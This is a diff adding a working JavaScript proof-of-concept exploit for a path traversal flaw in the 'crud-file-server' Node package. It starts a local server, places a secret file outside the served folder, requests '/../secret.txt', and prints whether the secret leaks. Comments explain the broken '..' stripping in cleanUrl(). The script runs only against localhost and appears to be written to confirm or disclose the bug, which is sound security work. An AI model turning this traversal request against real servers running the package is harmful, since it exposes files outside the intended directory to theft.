@@ -1,0 +1,54 @@
+```javascript
+const fs = require("fs");
+const path = require("path");
+const http = require("http");
+const server = require("crud-file-server");
+
+// Directory that is meant to be exposed by the file server
+const servedDir = path.join(__dirname, "public");
+fs.mkdirSync(servedDir, { recursive: true });
+fs.writeFileSync(path.join(servedDir, "hello.txt"), "hello from public dir");
+
+// A "secret" file living OUTSIDE the served directory that must never be reachable
+const secretPath = path.join(__dirname, "secret.txt");
+fs.writeFileSync(secretPath, "TOP-SECRET-DATA-" + Date.now());
+
+const httpServer = http
+  .createServer((req, res) => {
+    // vpath="" (no virtual path), expose only `servedDir`
+    server.handleRequest("", servedDir, req, res, false, false);
+  })
+  .listen(0, () => {
+    const port = httpServer.address().port;
+
+    // cleanUrl() in crud-file-server.js is broken:
+    //   while (url.indexOf('..').length > 0) { ... }
+    // indexOf() returns a Number, so `.length` is always `undefined`,
+    // meaning the loop body NEVER runs and ".." segments are never stripped.
+    // This lets us escape `servedDir` via classic path traversal.
+    const traversalPath = "/../secret.txt";
+
+    http.get({ port, path: traversalPath }, (res) => {
+      let body = "";
+      res.on("data", (chunk) => (body += chunk));
+      res.on("end", () => {
+        console.log("Status:", res.statusCode);
+        console.log("Response body:", body);
+
+        const secretContents = fs.readFileSync(secretPath, "utf8");
+        if (body.includes(secretContents)) {
+          console.log(
+            "\n[VULNERABLE] Path traversal succeeded: read file outside served directory:",
+            secretPath
+          );
+        } else {
+          console.log("\n[NOT VULNERABLE] Traversal blocked.");
+        }
+
+        httpServer.close();
+        fs.rmSync(servedDir, { recursive: true, force: true });
+        fs.rmSync(secretPath, { force: true });
+      });
+    });
+  });
+```
